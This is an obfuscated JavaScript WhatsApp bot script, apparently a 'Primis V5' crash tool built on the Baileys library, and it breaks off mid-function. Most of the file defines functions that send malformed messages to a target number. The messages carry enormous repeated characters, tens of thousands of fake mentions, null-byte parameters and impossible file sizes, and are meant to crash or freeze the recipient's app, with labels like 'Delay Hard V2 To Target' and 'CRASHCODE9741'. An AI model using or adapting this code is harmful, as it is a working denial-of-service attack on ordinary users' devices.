require("./setting");
const fs = require('fs');
const chalk = require("chalk");
const {
  spawn,
  exec,
  execSync
} = require('child_process');
const {
  default: baileys,
  proto,
  generateWAMessage,
  generateWAMessageFromContent,
  getContentType,
  prepareWAMessageMedia,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");
module.exports = prim = async (_0x35a9de, _0x51e776, _0x523e2a, _0x360dbe) => {
  try {
    const _0x55ab73 = _0x51e776.mtype === "conversation" ? _0x51e776.message.conversation : _0x51e776.mtype === "imageMessage" ? _0x51e776.message.imageMessage.caption : _0x51e776.mtype === "videoMessage" ? _0x51e776.message.videoMessage.caption : _0x51e776.mtype === "extendedTextMessage" ? _0x51e776.message.extendedTextMessage.text : _0x51e776.mtype === "buttonsResponseMessage" ? _0x51e776.message.buttonsResponseMessage.selectedButtonId : _0x51e776.mtype === 'listResponseMessage' ? _0x51e776.message.listResponseMessage.singleSelectReply.selectedRowId : _0x51e776.mtype === "templateButtonReplyMessage" ? _0x51e776.message.templateButtonReplyMessage.selectedId : _0x51e776.mtype === "interactiveResponseMessage" ? JSON.parse(_0x51e776.msg.nativeFlowResponseMessage.paramsJson).id : _0x51e776.mtype === "templateButtonReplyMessage" ? _0x51e776.msg.selectedId : _0x51e776.mtype === 'messageContextInfo' ? _0x51e776.message.buttonsResponseMessage?.["selectedButtonId"] || _0x51e776.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x51e776.text : '';
    const _0x254509 = _0x51e776.key.fromMe ? _0x35a9de.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x35a9de.user.id : _0x51e776.key.participant || _0x51e776.key.remoteJid;
    const _0x5a6815 = _0x254509.split('@')[0x0];
    const _0x36cf00 = typeof _0x51e776.text === "string" ? _0x51e776.text : '';
    const _0x177dd4 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x55ab73) ? _0x55ab73.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x16ba37 = _0x51e776.key.remoteJid;
    const _0x4e51fb = _0x16ba37.endsWith("@g.us");
    const _0xe8a781 = JSON.parse(fs.readFileSync("./start/lib/database/owner.json"));
    const _0x2f533f = await _0x35a9de.decodeJid(_0x35a9de.user.id);
    const _0xe3a414 = [_0x2f533f, ..._0xe8a781, ...global.owner].map(_0x2def2c => _0x2def2c.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x51e776.sender);
    const _0x54dd8f = _0x55ab73.slice(0x1).trim().split(/ +/).shift().toLowerCase();
    const _0x3271e7 = _0x55ab73.trim().split(/ +/).slice(0x1);
    const _0x28aff1 = _0x51e776.pushName || "No Name";
    const _0xc9fb1a = q = _0x3271e7.join(" ");
    const _0x5ce9fe = _0x4e51fb ? await _0x35a9de.groupMetadata(_0x51e776.chat)["catch"](_0x3e1a94 => {}) : '';
    const _0x460cf0 = _0x4e51fb ? _0x5ce9fe.subject : '';
    const _0x2fd7c2 = _0x4e51fb ? await _0x5ce9fe.participants : '';
    const {
      smsg: _0xa327c7,
      sendGmail: _0x18dbd7,
      formatSize: _0xba05f6,
      isUrl: _0x3f212f,
      generateMessageTag: _0x45e7ae,
      getBuffer: _0x1deeb8,
      getSizeMedia: _0x3ac141,
      runtime: _0x508858,
      fetchJson: _0x3b66d9,
      sleep: _0x598ae1
    } = require('./lib/myfunction');
    const _0xff5fcf = require('./lib/premium');
    const _0x50bf30 = _0xe3a414 ? true : _0xff5fcf.checkPremiumUser(_0x51e776.sender);
    if (_0x51e776.message) {
      console.log("[30m--------------------[0m");
      console.log(chalk.bgHex('#e74c3c').bold("▢ New Message"));
      console.log(chalk.bgHex("#00FF00").black("   ⌬ Date: " + new Date().toLocaleString() + " \n" + ("   ⌬ Message: " + (_0x51e776.body || _0x51e776.mtype) + " \n") + ("   ⌬ Sender: " + _0x51e776.pushname + " \n") + ("   ⌬ JID: " + _0x5a6815)));
      if (_0x51e776.isGroup) {
        console.log(chalk.bgHex('#00FF00').black("   ⌬ Group: " + _0x460cf0 + " \n" + ("   ⌬ GroupJid: " + _0x51e776.chat)));
      }
      console.log();
    }
    const _0x247242 = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        ...(_0x16ba37 ? {
          'remoteJid': '0@s.whatsapp.net'
        } : {})
      },
      'message': {
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
          'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': '974197419741',
          'pageCount': "974197419741",
          'mediaKey': '5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=',
          'fileName': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻",
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
          'mediaKeyTimestamp': '1715880173',
          'contactVcard': true
        },
        'title': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻" + 'ꦾ'.repeat(0x19258),
        'body': {
          'text': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻" + 'ꦾ'.repeat(0x19258) + '@1'.repeat(0x249f0)
        },
        'nativeFlowMessage': {},
        'contextInfo': {
          'mentionedJid': ["1@newsletter"],
          'groupMentions': [{
            'groupJid': "1@newsletter",
            'groupSubject': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻"
          }]
        }
      },
      'contextInfo': {
        'mentionedJid': [_0x51e776.chat],
        'externalAdReply': {
          'showAdAttribution': true,
          'title': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻",
          'body': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻",
          'mediaType': 0x3,
          'renderLargerThumbnail': true,
          'thumbnailUrl': "your-thumbnail-url-here",
          'sourceUrl': "https://t.me/apex"
        },
        'forwardedNewsletterMessageInfo': {
          'newsletterJid': "120363321780343299@newsletter",
          'serverMessageId': 0x1,
          'newsletterName': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻"
        }
      },
      'expiryTimestamp': 0x0,
      'amount': {
        'value': "999999999",
        'offset': 0x3b9ac9ff,
        'currencyCode': "CRASHCODE9741"
      },
      'background': {
        'id': "100",
        'fileLength': "928283",
        'width': 0x3e8,
        'height': 0x3e8,
        'mimetype': "application/vnd.ms-powerpoint",
        'placeholderArgb': 0xff000000,
        'textArgb': 0xffffffff,
        'subtextArgb': 0xff000000
      }
    };
    async function _0x164203(_0x2454c6, _0x40ae29 = true) {
      let _0x515dfa = await generateWAMessageFromContent(_0x2454c6, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻",
                'hasMediaAttachment': false
              },
              'body': {
                'text': ''
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{'.repeat(0x13880)
              }
            }
          }
        }
      }, {});
      await _0x35a9de.relayMessage(_0x2454c6, _0x515dfa.message, {
        'messageId': _0x515dfa.key.id,
        'participant': {
          'jid': _0x2454c6
        }
      });
    }
    ;
    async function _0x127b29(_0x35ee79, _0x51cdfe = true) {
      try {
        let _0x2dc243 = {
          'ephemeralMessage': {
            'message': {
              'interactiveMessage': {
                'header': {
                  'title': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻" + 'ꦽꦂ'.repeat(0x2328),
                  'liveLocationMessage': {
                    'degreesLatitude': 0x3d160,
                    'degreesLongitude': -0x3d160,
                    'name': "\0",
                    'address': "\0"
                  },
                  'hasMediaAttachment': false
                },
                'body': {
                  'text': '',
                  'format': "DEFAULT"
                },
                'footer': {
                  'text': '☣︎'
                },
                'nativeFlowMessage': {
                  'messageParamsJson': '{'.repeat(0x13880)
                },
                'contextInfo': {
                  'participant': _0x35ee79,
                  'mentionedJid': ["0@s.whatsapp.net", ...Array.from({
                    'length': 0x7530
                  }, () => '1' + Math.floor(Math.random() * 0x4c4b40) + "@s.whatsapp.net")]
                }
              }
            }
          }
        };
        await _0x35a9de.relayMessage(_0x35ee79, _0x2dc243, {
          'messageId': null,
          'participant': {
            'jid': _0x35ee79
          },
          'userJid': _0x35ee79
        });
      } catch (_0x59d89) {
        console.log(_0x59d89);
      }
    }
    async function _0x35420c(_0x27cd75) {
      try {
        let _0x39353f = {
          'ephemeralMessage': {
            'message': {
              'interactiveMessage': {
                'header': {
                  'title': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5",
                  'hasMediaAttachment': false,
                  'locationMessage': {
                    'degreesLatitude': -0x18d5d42aa,
                    'degreesLongitude': 0x18d5d42aa,
                    'name': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5",
                    'address': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5"
                  }
                },
                'body': {
                  'text': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5"
                },
                'nativeFlowMessage': {
                  'messageParamsJson': '{'.repeat(0x2710)
                },
                'contextInfo': {
                  'participant': _0x27cd75,
                  'mentionedJid': ["0@s.whatsapp.net", ...Array.from({
                    'length': 0x7530
                  }, () => '1' + Math.floor(Math.random() * 0x4c4b40) + "@s.whatsapp.net")]
                }
              }
            }
          }
        };
        await _0x35a9de.relayMessage(_0x27cd75, _0x39353f, {
          'messageId': null,
          'participant': {
            'jid': _0x27cd75
          },
          'userJid': _0x27cd75
        });
      } catch (_0x229bed) {
        console.log(_0x229bed);
      }
    }
    async function _0x75052a(_0x27ed7f, _0x2948b7) {
      console.log(chalk.blue("Delay Hard V2 To Target " + _0x27ed7f));
      let _0x552bf8 = {
        'viewOnceMessage': {
          'message': {
            'stickerMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
              'fileSha256': "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
              'fileEncSha256': "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
              'mediaKey': "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
              'mimetype': "image/webp",
              'directPath': "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
              'fileLength': {
                'low': 0x1,
                'high': 0x0,
                'unsigned': true
              },
              'mediaKeyTimestamp': {
                'low': 0x68138ed3,
                'high': 0x0,
                'unsigned': false
              },
              'firstFrameLength': 0x4dc0,
              'firstFrameSidecar': "KN4kQ5pyABRAgA==",
              'isAnimated': true,
              'contextInfo': {
                'mentionedJid': ["0@s.whatsapp.net", ...Array.from({
                  'length': 0x9c40
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'groupMentions': [],
                'entryPointConversionSource': "non_contact",
                'entryPointConversionApp': 'whatsapp',
                'entryPointConversionDelaySeconds': 0x72289
              },
              'stickerSentTs': {
                'low': -0x739a157b,
                'high': 0x196,
                'unsigned': false
              },
              'isAvatar': false,
              'isAiSticker': false,
              'isLottie': false
            }
          }
        }
      };
      const _0xa13954 = generateWAMessageFromContent(_0x27ed7f, _0x552bf8, {});
      await _0x35a9de.relayMessage("status@broadcast", _0xa13954.message, {
        'messageId': _0xa13954.key.id,
        'statusJidList': [_0x27ed7f],
        'additionalNodes': [{
          'tag': 'meta',
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x27ed7f
              },
              'content': undefined
            }]
          }]
        }]
      });
    }
    async function _0x2d3dfd(_0x4a68fd) {
      await _0x35a9de.relayMessage(_0x4a68fd, {
        'viewOnceMessage': {
          'message': {
            'interactiveResponseMessage': {
              'body': {
                'text': "visiblemoment",
                'format': "DEFAULT"
              },
              'nativeFlowResponseMessage': {
                'name': "call_permission_request",
                'paramsJson': "\0".repeat(0xf4240),
                'version': 0x3
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x4a68fd
        }
      });
      console.log(chalk.yellow("NullVisibleAttackDeviceYou"));
    }
    async function _0x2849d6(_0xf4ab02) {
      let _0x5e9ff1 = JSON.stringify({
        'status': true,
        'criador': "VenomMods",
        'resultado': {
          'type': 'md',
          'ws': {
            '_events': {
              'CB:ib,,dirty': ["Array"]
            },
            '_eventsCount': 0xc3500,
            '_maxListeners': 0x0,
            'url': "wss://web.whatsapp.com/ws/chat",
            'config': {
              'version': ["Array"],
              'browser': ["Array"],
              'waWebSocketUrl': 'wss://web.whatsapp.com/ws/chat',
              'connCectTimeoutMs': 0x4e20,
              'keepAliveIntervalMs': 0x7530,
              'logger': {},
              'printQRInTerminal': false,
              'emitOwnEvents': true,
              'defaultQueryTimeoutMs': 0xea60,
              'customUploadHosts': [],
              'retryRequestDelayMs': 0xfa,
              'maxMsgRetryCount': 0x5,
              'fireInitQueries': true,
              'auth': {
                'Object': "authData"
              },
              'markOnlineOnconnCect': true,
              'syncFullHistory': true,
              'linkPreviewImageThumbnailWidth': 0xc0,
              'transactionOpts': {
                'Object': "transactionOptsData"
              },
              'generateHighQualityLinkPreview': false,
              'options': {},
              'appStateMacVerification': {
                'Object': "appStateMacData"
              },
              'mobile': true
            }
          }
        }
      });
      let _0x20bc80 = [{
        'attrs': {
          'biz_bot': '1'
        },
        'tag': "bot"
      }, {
        'attrs': {},
        'tag': "biz"
      }];
      let _0x7bc373 = {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 3.2,
              'isStatusBroadcast': true,
              'statusBroadcastJid': "status@broadcast",
              'badgeChat': {
                'unreadCount': 0x270f
              }
            },
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': 'proto@newsletter',
              'serverMessageId': 0x1,
              'newsletterName': "DELAY - 🩸" + "MARKER - 🩸".repeat(0xa),
              'contentType': 0x3,
              'accessibilityText': "Primis - 🩸 " + '﹏'.repeat(0x18e72)
            },
            'interactiveMessage': {
              'contextInfo': {
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0xf4ab02
                },
                'dataSharingContext': {
                  'showMmDisclosure': true
                },
                'participant': '0@s.whatsapp.net',
                'mentionedJid': ["13135550002@s.whatsapp.net"]
              },
              'body': {
                'text': "" + 'ꦽ'.repeat(0x18e72) + "".repeat(0x18e72)
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'single_select',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "payment_method",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f),
                  'voice_call': 'call_galaxy'
                }, {
                  'name': "form_message",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'wa_payment_learn_more',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "wa_payment_transaction_details",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "wa_payment_fbpin_reset",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "catalog_message",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'payment_info',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'review_order',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "send_location",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'payments_care_csat',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'view_product',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "payment_settings",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "address_message",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'automated_greeting_message_view_catalog',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "open_webview",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "message_with_link_status",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "payment_status",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'galaxy_costum',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "extensions_message_v2",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "landline_call",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'mpm',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "cta_copy",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'review_and_pay',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': 'galaxy_message',
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }, {
                  'name': "cta_call",
                  'buttonParamsJson': _0x5e9ff1 + "".repeat(0x270f)
                }]
              }
            }
          },
          'additionalNodes': _0x20bc80,
          'stanzaId': 'stanza_' + Date.now()
        }
      };
      await _0x35a9de.relayMessage(_0xf4ab02, _0x7bc373, {
        'participant': {
          'jid': _0xf4ab02
        }
      });
    }
    async function _0x5460e8(_0x4c53b5) {
      const _0x12072c = {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                  'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  'fileLength': "999999999999",
                  'pageCount': 0x9ff9ff9ff1ff90000000,
                  'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  'fileName': "In Scorpio Locked You Device",
                  'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1715880173"
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻" + 'ꦾ'.repeat(0x249f0) + '@1'.repeat(0x3d090)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': 'ALWAYSAQIOO'
                }],
                'isForwarded': true,
                'quotedMessage': {
                  'documentMessage': {
                    'url': 'https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0',
                    'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                    'fileSha256': 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                    'fileLength': "999999999999",
                    'pageCount': 0x9ff9ff9ff1ff90000000,
                    'mediaKey': 'lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=',
                    'fileName': "Alwaysaqioo The Juftt️",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': '/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0',
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      };
      _0x35a9de.relayMessage(_0x4c53b5, _0x12072c, {}, {
        'messageId': null
      });
    }
    async function _0x448e29(_0x29c61e, _0x4a58d5) {
      let _0x187721 = {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': {
              'contextInfo': {
                'mentionedJid': [_0x4a58d5],
                'isForwarded': true,
                'forwardingScore': 0x5f5e0ff,
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0x4a58d5
                }
              },
              'body': {
                'text': "༑⌁⃰Primis Is hereཀ‌‌🦠" + 'ꦾ'.repeat(0x88b8)
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{'.repeat(0x3a98),
                'buttons': [{
                  'name': "single_select",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "call_permission_request",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': 'cta_url',
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "cta_call",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "cta_copy",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "cta_reminder",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "cta_cancel_reminder",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': 'address_message',
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "send_location",
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': 'quick_reply',
                  'ParamsJson': '{'.repeat(0x3a98),
                  'version': 0x3
                }, {
                  'name': "mpm",
                  'ParamsJson': '{'.repeat(0x2710),
                  'version': 0x3
                }]
              }
            }
          }
        }
      };
      await _0x29c61e.relayMessage(_0x4a58d5, _0x187721, {
        'participant': {
          'jid': _0x4a58d5
        }
      });
    }
    async function _0x1247a5(_0x249d6d) {
      let _0x29e123 = "༑⌁⃰Primis Is hereཀ‌‌🦠" + 'ꦾ'.repeat(0xfde8);
      await _0x35a9de.relayMessage(_0x249d6d, {
        'locationMessage': {
          'degreesLatitude': 999.035,
          'degreesLongitude': -999.035,
          'name': _0x29e123,
          'url': "https://youtube.com/@DevPrimis-z9e",
          'address': '𑇂𑆵𑆴𑆿'.repeat(0xafc8)
        },
        'hasMediaAttachment': true
      }, {
        'participant': {
          'jid': _0x249d6d,
          'mentionedJid': ["0@s.whatsapp.net", ...Array.from({
            'length': 0x7530
          }, () => '1' + Math.floor(Math.random() * 0x4c4b40) + "@s.whatsapp.net")]
        }
      });
    }
    async function _0x29f67d(_0x35acc5) {
      const _0x465f80 = Array.from({
        'length': 0x7530
      }, (_0x515e67, _0x11994d) => ({
        'title': '᭡꧈'.repeat(0x17318),
        'rows': [{
          'title': '' + (_0x11994d + 0x1),
          'id': '' + (_0x11994d + 0x1)
        }]
      }));
      const _0x15be29 = {
        'viewOnceMessage': {
          'message': {
            'listResponseMessage': {
              'title': "Primis Is Here!",
              'listType': 0x2,
              'buttonText': null,
              'sections': _0x465f80,
              'singleSelectReply': {
                'selectedRowId': '🔴'
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net"),
                'participant': _0x35acc5,
                'remoteJid': "status@broadcast",
                'forwardingScore': 0x260d,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "333333333333@newsletter",
                  'serverMessageId': 0x1,
                  'newsletterName': '-'
                }
              },
              'description': "Dont Bothering Me Bro!!!"
            }
          }
        },
        'contextInfo': {
          'channelMessage': true,
          'statusAttributionType': 0x2
        }
      };
      const _0x49a0b4 = generateWAMessageFromContent(_0x35acc5, _0x15be29, {});
      await _0x35a9de.relayMessage("status@broadcast", _0x49a0b4.message, {
        'messageId': _0x49a0b4.key.id,
        'statusJidList': [_0x35acc5],
        'additionalNodes': [{
          'tag': 'meta',
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x35acc5
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x35acc5) {
        await _0x35a9de.relayMessage(_0x35acc5, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x49a0b4.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "Primis Is Here! "
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x2fd6f1(_0x34be34) {
      let _0x4fd8a9 = {
        'viewOnceMessage': {
          'message': {
            'stickerMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
              'fileSha256': "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
              'fileEncSha256': "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
              'mediaKey': "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
              'mimetype': 'image/webp',
              'directPath': "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
              'fileLength': {
                'low': 0x1,
                'high': 0x0,
                'unsigned': true
              },
              'mediaKeyTimestamp': {
                'low': 0x68138ed3,
                'high': 0x0,
                'unsigned': false
              },
              'firstFrameLength': 0x4dc0,
              'firstFrameSidecar': "KN4kQ5pyABRAgA==",
              'isAnimated': true,
              'contextInfo': {
                'mentionedJid': ['0@s.whatsapp.net', ...Array.from({
                  'length': 0x9c40
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'groupMentions': [],
                'entryPointConversionSource': 'non_contact',
                'entryPointConversionApp': "whatsapp",
                'entryPointConversionDelaySeconds': 0x72289
              },
              'stickerSentTs': {
                'low': -0x739a157b,
                'high': 0x196,
                'unsigned': false
              },
              'isAvatar': false,
              'isAiSticker': false,
              'isLottie': false
            }
          }
        }
      };
      const _0x1c5539 = generateWAMessageFromContent(_0x34be34, _0x4fd8a9, {});
      await _0x35a9de.relayMessage("status@broadcast", _0x1c5539.message, {
        'messageId': _0x1c5539.key.id,
        'statusJidList': [_0x34be34],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': 'mentioned_users',
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x34be34
              },
              'content': undefined
            }]
          }]
        }]
      });
    }
    async function _0x3def04(_0x1693d2) {
      const _0x1a5851 = generateWAMessageFromContent(_0x1693d2, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': "\0"
              },
              'carouselMessage': {
                'cards': [{
                  'header': {
                    ...(await prepareWAMessageMedia({
                      'image': {
                        'url': 'https://files.catbox.moe/qvyfgx.jpg'
                      }
                    }, {
                      'upload': _0x35a9de.waUploadToServer
                    })),
                    'title': "\0",
